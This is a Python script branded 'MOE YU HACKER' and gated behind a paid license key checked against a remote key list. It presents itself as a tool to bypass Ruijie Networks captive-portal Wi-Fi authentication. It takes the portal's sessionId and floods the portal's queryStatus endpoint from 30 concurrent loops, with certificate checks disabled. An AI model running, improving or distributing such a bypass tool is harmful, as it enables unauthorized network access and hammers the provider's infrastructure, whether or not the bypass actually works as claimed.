import asyncio
import aiohttp
import requests
import urllib3
import os
import sys
import uuid
import random
import datetime
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# ===============================
# CONFIG & LOGO
# ===============================
DB_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

GREETING_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [bold yellow] <( မင်္ဂလာပါ )[/bold yellow]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    if os.path.exists(id_file):
        with open(id_file, "r") as f: return f.read().strip()
    new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
    with open(id_file, "w") as f: f.write(new_id)
    return new_id

def check_license():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(GREETING_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="cyan", expand=False)))
    
    try:
        user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
        res = requests.get(DB_URL, timeout=10)
        for line in res.text.splitlines():
            parts = line.split("|")
            if user_key == parts[0].strip():
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    print("\n[!] HWID Mismatch."); sys.exit()
                print(f"\n[✓] ACCESS GRANTED!"); return True
        print("\n[!] Invalid Key."); sys.exit()
    except:
        print("\n[!] Connection Error."); sys.exit()

# ===============================
# CLOUD QUERY BYPASS (NEW PATH)
# ===============================
async def bypass_pulse(session, url):
    while True:
        try:
            # 403 ကျော်ဖို့ queryStatus path ကို ပြောင်းသုံးခြင်း
            async with session.get(url, timeout=5) as response:
                status_color = "\033[92m" if response.status in [200, 302] else "\033[91m"
                sys.stdout.write(f"{status_color}[✓] BYPASS ACTIVE | STATUS: {response.status}\033[0m\r")
                sys.stdout.flush()
        except: pass
        await asyncio.sleep(0.05)

async def start_engine(portal_link):
    p = parse_qs(urlparse(portal_link).query)
    sid = p.get('sessionId', [None])[0]
    
    if not sid:
        console.print("[bold red][-] sessionId မတွေ့ပါ။ Browser က Link အမှန်ကို ပြန်ယူပါ။[/bold red]")
        return

    # လမ်းကြောင်းအသစ် (v2 login အစား status query ကို သုံးထားသည်)
    query_path = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/queryStatus?sessionId={sid}"
    
    console.print(f"\n[bold green][+] Session ID: {sid[:12]}[/bold green]")
    console.print("[bold yellow][*] Cloud Query Bypass စတင်နေပြီ...[/bold yellow]\n")

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        tasks = [asyncio.create_task(bypass_pulse(session, query_path)) for _ in range(30)]
        await asyncio.gather(*tasks)

def main():
    if check_license():
        console.print("\n[1] Auto Detect\n[2] Manual Link")
        mode = input("\nSelect Mode: ").strip()
        if mode == "2":
            link = input("\nPaste Portal URL: ").strip()
            asyncio.run(start_engine(link))
        else:
            try:
                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
                asyncio.run(start_engine(r.url))
            except: pass

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit()
